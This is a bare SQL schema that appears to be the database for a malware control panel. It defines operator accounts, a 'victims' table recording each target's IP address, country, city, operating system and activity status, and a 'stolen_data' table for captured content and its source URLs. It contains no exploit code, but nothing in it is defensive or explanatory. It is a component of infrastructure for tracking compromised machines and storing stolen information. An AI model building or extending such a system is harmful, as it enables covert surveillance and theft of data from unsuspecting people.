CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255),
    created_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE victims (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
    name VARCHAR(100),
    ip_address VARCHAR(45),
    country VARCHAR(50),
    city VARCHAR(50),
    os VARCHAR(100),
    status VARCHAR(20) DEFAULT 'active',
    first_seen TIMESTAMP DEFAULT NOW(),
    last_seen TIMESTAMP DEFAULT NOW()
);

CREATE TABLE stolen_data (
    id SERIAL PRIMARY KEY,
    victim_id INTEGER REFERENCES victims(id) ON DELETE CASCADE,
    data_type VARCHAR(50),
    data_content TEXT,
    source_url VARCHAR(500),
    captured_at TIMESTAMP DEFAULT NOW()
);
